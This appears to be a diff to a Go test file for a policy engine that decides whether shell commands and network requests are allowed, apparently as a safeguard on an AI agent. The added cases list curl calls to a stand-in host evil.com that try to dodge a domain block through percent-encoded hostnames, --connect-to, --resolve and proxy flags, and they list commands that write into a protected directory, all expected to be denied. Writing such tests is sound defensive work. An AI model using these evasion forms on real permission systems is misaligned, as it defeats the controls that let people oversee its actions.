@@ -599,6 +599,14 @@ rules:
 		{"sh -c 'echo x >> private/log'", ActionDeny, "deny-private"},
 		{"rm -rf private", ActionDeny, "deny-private"},
 		{"curl -o private/x https://good.com/x", ActionDeny, "deny-private"},
+		// 隐式写入：定级至少 write_in_project 的段写它的工作目录与全部操作数、选项值
+		{"go build -o private/a .", ActionDeny, "deny-private"},
+		{"git mv x private/a", ActionDeny, "deny-private"},
+		{"prettier --write private/a", ActionDeny, "deny-private"},
+		{"cd private && git init", ActionDeny, "deny-private"},
+		{"git -C private init", ActionDeny, "deny-private"},
+		{"go build ./...", ActionAllow, "builtin-write-in-project"},
+		{"cd private && cat a", ActionAllow, "builtin-readonly"},
 		{"mkdir -p public/sub", ActionAllow, "builtin-write-in-project"},
 		{"cat private/a", ActionAllow, "builtin-readonly"},
 		{"curl https://evil.com/x", ActionDeny, "deny-evil"},
@@ -608,6 +616,13 @@ rules:
 		{"curl evil.com/x", ActionDeny, "deny-evil"},
 		{`URL=https://evil.com/x curl "$URL"`, ActionDeny, "deny-evil"},
 		{"bash -c 'curl -s https://evil.com/i | true'", ActionDeny, "deny-evil"},
+		{"curl https://evil%2ecom/x", ActionDeny, "deny-evil"},
+		{"curl --connect-to ::evil.com: https://good.com", ActionDeny, "deny-evil"},
+		{"curl --connect-to good.com:443:evil.com:443 https://good.com", ActionDeny, "deny-evil"},
+		{"curl --resolve=good.com:443:evil.com https://good.com", ActionDeny, "deny-evil"},
+		{"curl -x evil.com:8080 https://good.com", ActionDeny, "deny-evil"},
+		{"curl -xevil.com:8080 https://good.com", ActionDeny, "deny-evil"},
+		{"curl --proxy evil.com:3128 https://good.com", ActionDeny, "deny-evil"},
 		{"curl https://good.com/x", ActionAllow, "learned-curl"},
 		{"echo https://notevil.com", ActionAllow, "builtin-readonly"},
 		// allow 规则的 path_glob 只对 file_write 生效
@@ -624,6 +639,16 @@ rules:
 	}
 	if d := e.Evaluate(Payload{Type: PayloadNetwork, URL: "https://evil.com/"}, projCtx); d.Action != ActionDeny {
 		t.Errorf("network 仍应被 domain deny 拦下, 得到 %s/%q", d.Action, d.RuleID)
+	}
+	if d := e.Evaluate(Payload{Type: PayloadNetwork, URL: "https://evil%2ecom/"}, projCtx); d.Action != ActionDeny {
+		t.Errorf("百分号编码的主机也应被 domain deny 拦下, 得到 %s/%q", d.Action, d.RuleID)
+	}
+	// 工作目录在受保护目录里时，会写的命令都算写进去
+	for _, c := range []string{"git init", "go mod init x"} {
+		p := Payload{Type: PayloadShell, Command: c, Cwd: "/home/u/proj/private"}
+		if d := e.Evaluate(p, projCtx); d.Action != ActionDeny || d.RuleID != "deny-private" {
+			t.Errorf("Cwd private 下 %q 得到 %s/%q, 想要 deny", c, d.Action, d.RuleID)
+		}
 	}
 }
 
@@ -833,6 +858,8 @@ func TestHostMatches(t *testing.T) {
 		{"https://notexample.com/", "example.com", false},
 		{"https://example.com.evil.net/", "example.com", false},
 		{"https://example.com@evil.net/", "example.com", false},
+		{"https://example%2ecom/x", "example.com", true},
+		{"https://api.example%2Ecom:8443/", "example.com", true},
 		{"example.com/x", "example.com", false},
 	}
 	for _, c := range cases {
